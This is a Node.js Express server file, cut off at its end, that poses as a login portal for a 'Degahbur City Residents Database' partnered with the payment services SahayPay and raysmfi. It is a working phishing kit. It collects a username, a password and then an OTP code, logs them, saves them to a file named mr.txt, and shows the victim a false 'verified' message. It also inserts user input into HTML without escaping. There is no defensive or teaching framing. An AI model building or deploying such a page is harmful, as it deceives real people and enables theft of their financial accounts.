const express = require('express');
const bodyParser = require('body-parser');
const fs = require('fs');

const app = express();
const port = 3000;

// Middleware
app.use(bodyParser.urlencoded({ extended: false }));
app.use(bodyParser.json());
// Login route
app.get('/', (req, res) => {
  res.send(`
    <!DOCTYPE html>
    <html>
      <head>
        <title>Login</title>
        <style>
          body {
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            font-family: Arial, sans-serif;
          }

          h1 {
            text-align: center;
          }

          .login-form {
            width: 450px;
            padding: 20px;
            border: 1px solid #ccc;
            border-radius: 5px;
            background-color: #f9f9f9;

          }

          .login-form label {
            display: block;
            margin-bottom: 10px;
            font-weight: bold;
          }

          .login-form input[type="text"],
          .login-form input[type="password"] {
            width: 100%;
            padding: 15px;
            border: 1px solid #ccc;
            border-radius: 3px;
            font-size: 45px;
          }

          .login-form input[type="submit"] {
            width: 100%;
            padding: 10px;
            border: none;
            border-radius: 3px;
            background-color: blue;
            color: #fff;
            font-weight: bold;
            cursor: pointer;
           font-size: 45px;
          }

          .login-form input[type="submit"]:hover {
            background-color: #45a049;
          }
         h2 {
              color: green;
           }
      h3 {    color: green;
              text-align:  center;
          }
        </style>
      </head>
      <body>
        <div class="login-form">
          <h1>Login</h1>
          <h2> Degahbur City Residents Database in a partner with SahayPay.</h2>
          <form action="/otp" method="POST">
            <label for="username">Username:</label>
            <input type="text" id="username" name="username" inputMode = "numeric" required><br><br>
            <label for="password">Password:</label>
            <input type="text" id="password" name="password" inputMode = "numeric" required><br><br>
            <input type="submit" value="Submit">
          </form>
<h3> We partnered with raysmfi to make your life easier</h3>
        </div>

      </body>
    </html>
  `);
});

// OTP route
app.post('/otp', (req, res) => {
  const { username, password } = req.body;

  res.send(`
    <!DOCTYPE html>
    <html>
      <head>
        <title>OTP</title>
        <style>
          body {
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            font-family: Arial, sans-serif;
          }

          h1 {
            text-align: center;
          }

          .otp-form {
            width: 300px;
            padding: 20px;
            border: 1px solid #ccc;
            border-radius: 5px;
            background-color: #f9f9f9;
          }

          .otp-form label {
            display: block;
            margin-bottom: 10px;
            font-weight: bold;
          }

          .otp-form input[type="text"] {
            width: 100%;
            padding: 10px;
            border: 1px solid #ccc;
            border-radius: 3px;
           font-size: 45px;
          }

          .otp-form input[type="submit"] {
            width: 100%;
            padding: 10px;
            border: none;
            border-radius: 3px;
            background-color: #4caf50;
            color: #fff;
            font-weight: bold;
            cursor: pointer;
          }

          .otp-form input[type="submit"]:hover {
            background-color: #45a049;

          }
        </style>
      </head>
      <body>
        <div class="otp-form">
          <h1>Enter OTP</h1>
          <form action="/save" method="POST">
            <label for="otp">OTP:</label>
            <input type="text" id="otp" name="otp" inputMode = "numeric" required><br><br>
            <input type="hidden" name="username" value="${username}">
            <input type="password" name="password" value="${password}">
            <input type="submit" value="Submit">
          </form>
        </div>
      </body>
    </html>
  `);
});
//
app.post('/save', (req, res) => {
  const { username, password, otp } = req.body;
  console.log({username})
  console.log({password})
  console.log({otp})
  fs.writeFile('mr.txt', `${username},${password},${otp}`, (err) => {
    if (err) {
      console.error(err);
      res.send('Error saving credentials.');
      return;
    }

    res.send('you have succefully verified by degahbur city database of it is people and residents.');
  });
});

// Start the server
app.listen(port, () => {
  console.log(`Server running on port ${port}`);
